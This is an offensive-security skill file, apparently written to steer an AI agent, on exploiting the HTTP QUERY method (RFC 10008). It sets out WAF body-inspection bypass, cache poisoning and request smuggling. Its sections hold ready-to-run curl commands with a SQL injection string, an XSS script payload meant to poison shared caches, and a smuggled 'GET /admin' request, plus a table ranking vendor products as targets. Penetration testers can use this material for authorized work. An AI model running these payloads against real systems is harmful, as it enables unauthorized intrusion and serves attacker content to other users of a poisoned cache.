---
name: http-query-method
description: Exploit HTTP QUERY method (RFC 10008, June 2026) parser differentials -- WAF body inspection bypass, cache poisoning via body-ignorant caching, and request smuggling from body handling disagreements. Use when target has a CDN/cache/WAF layer and accepts or forwards unknown HTTP methods, or when testing for method-based parser differentials.
---

# HTTP QUERY Method Exploitation

RFC 10008 (June 2026) defines QUERY -- the first new HTTP method standardized in 20+ years. It is semantically GET-with-a-body: safe, idempotent, cacheable, but the response cache key MUST include the request body and Content-Type.

Most infrastructure does not implement this correctly yet. The adoption gap between spec and deployment is the attack surface.

## When to Use

- Target sits behind a CDN, cache, or WAF (most do)
- WAF blocks injection payloads in POST bodies but you haven't tested QUERY
- Cache layer detected (Varnish, Squid, CloudFront, Fastly, Cloudflare, Akamai)
- Target accepts or forwards unrecognized HTTP methods (test with `curl -X QUERY`)
- You've exhausted standard `parser-differential-bypass` and `h2-waf-bypass` techniques

## QUERY vs GET vs POST

| Property | GET | POST | QUERY |
|---|---|---|---|
| Safe / idempotent | Yes / Yes | No / No | Yes / Yes |
| Body | Ignored by most infra | Required | Required |
| Cacheable | Yes (URL-keyed) | No | Yes (URL + body + Content-Type keyed) |
| CORS safelisted | Yes | Yes (simple) | No (triggers preflight) |

The critical difference: QUERY responses are cacheable but the cache key must include the body. Caches that don't understand QUERY will key on URL only -- identical to GET -- creating poisoning conditions.

## Attack Scenarios

### 1. WAF Body Inspection Bypass

WAFs apply method-specific inspection. Most inspect POST bodies for injection. If the WAF doesn't recognize QUERY, it may skip body inspection entirely or apply GET-tier rules (URL only).

```bash
# Baseline: POST blocked by WAF
curl -X POST https://target.com/api/search \
  -d "q=' OR 1=1--"

# Test: same payload via QUERY
curl -X QUERY https://target.com/api/search \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "q=' OR 1=1--"
```

If POST returns WAF block (403/406) but QUERY reaches the backend, you have an inspection gap. The QUERY method is the bypass -- the finding is whatever the payload achieves (SQLi, XSS, etc.).

### 2. Cache Poisoning via Body-Ignorant Caching

If the cache treats QUERY like GET (keys on URL only, ignores body):

**Primary case (QUERY-to-QUERY, body ignored in cache key):**

1. Attacker sends `QUERY /search` with body `{"q":"<script>alert(1)</script>"}`
2. Backend processes the query, returns results containing the reflected payload
3. Cache stores response keyed on method + URL only (body ignored)
4. Victim sends `QUERY /search` with a different body -- receives the attacker's cached response

**Escalated case (method also ignored in cache key):**

If the cache ignores both body and method, the poisoned QUERY response is also served to `GET /search` requests -- affecting all users, not just QUERY senders.

```bash
# Step 1: poison the cache
curl -X QUERY https://target.com/search \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(document.domain)</script>"}'

# Step 2: verify cache serves poisoned response to clean request
curl https://target.com/search
```

Check `Age`, `X-Cache`, `CF-Cache-Status` headers to confirm caching behavior.

### 3. Request Smuggling via Body Handling Disagreement

Front-end (CDN/LB) treats QUERY as bodyless (like GET), ignores Content-Length. Back-end reads the body. The "ignored" body becomes a new request from the back-end's perspective.

```bash
# Through CDN -- compare behavior
curl -X QUERY https://target.com/ \
  -H "Content-Type: text/plain" \
  -H "Content-Length: 50" \
  -d "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"

# Direct to origin -- compare Content-Length handling
curl -X QUERY https://origin-ip/ \
  -H "Host: target.com" \
  -H "Content-Type: text/plain" \
  -H "Content-Length: 50" \
  -d "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

Divergence in body handling between CDN and origin = smuggling potential. See `te0-request-smuggling` and `h2-waf-bypass` skills for full smuggling methodology.

### 4. Method Routing Confusion

Frameworks that don't recognize QUERY may route it to a catch-all handler with weaker authorization, or fall through to GET/POST handlers with different access controls.

```bash
# Does QUERY reach a different handler than GET?
curl -X QUERY https://target.com/admin/users \
  -H "Content-Type: application/json" \
  -d '{"page":1}'

# Compare with GET
curl https://target.com/admin/users
```

A 405 response leaks the `Allow` header (supported methods) -- useful recon but not a finding by itself.

## Adoption Gaps (as of July 2026)

| Layer | QUERY Support | Implication |
|---|---|---|
| Node.js / Express | Accepts (custom methods routed via app.all/router.all) | Backend processes QUERY bodies |
| Go net/http | Accepts (any method string handled) | Backend processes QUERY bodies |
| Spring / Rails | Pending / Under discussion | May reject or misroute |
| Cloudflare / Akamai | Co-authored RFC -- QUERY-specific caching behavior untested | CDN may pass through but cache keying unverified |
| Varnish / Squid / HAProxy | Unknown | Highest-signal cache differential targets |
| ModSecurity / AWS WAF / Azure WAF | No documented rules | Likely skip body inspection |
| Imperva / F5 BIG-IP | No public updates | Method whitelists may block or pass without inspection |
| Nginx | Passes through, config-dependent | `limit_except` directives may not include QUERY |

**Test priority:** targets behind Varnish, Squid, HAProxy, or any WAF without documented QUERY support.

## Testing Checklist

```
1. [ ] Does target accept QUERY? (send QUERY, check for non-405 response)
2. [ ] WAF bypass: send blocked POST payload via QUERY -- does it pass?
3. [ ] Cache behavior: send QUERY with body, check cache headers (Age, X-Cache)
4. [ ] Cache key: send two QUERY requests with different bodies to same URL -- same cached response?
5. [ ] Body stripping: send QUERY with body through CDN, verify origin receives body intact
6. [ ] Smuggling: compare QUERY body handling CDN vs direct-to-origin
7. [ ] Routing: does QUERY reach a different handler or authz context than GET/POST?
```

## Related Skills

- **parser-differential-bypass** -- general parser differential methodology
- **h2-waf-bypass** -- WAF bypass via HTTP/2 framing (complementary vector)
- **web-cache-deception-path** -- cache deception via path confusion (different primitive, same cache layer)
- **te0-request-smuggling** -- smuggling methodology applicable to QUERY body disagreements

## References

- [RFC 10008](https://www.rfc-editor.org/rfc/rfc10008.html) -- HTTP QUERY Method specification
- [Hive Security: HTTP QUERY Attack Surface](https://hivesecurity.gitlab.io/blog/http-query-method-rfc-10008-attack-surface/) -- WAF bypass, cache poisoning, smuggling analysis
- [WAFFLED: Parsing Discrepancies in WAFs](https://arxiv.org/html/2503.10846v4) -- general WAF parsing differential research
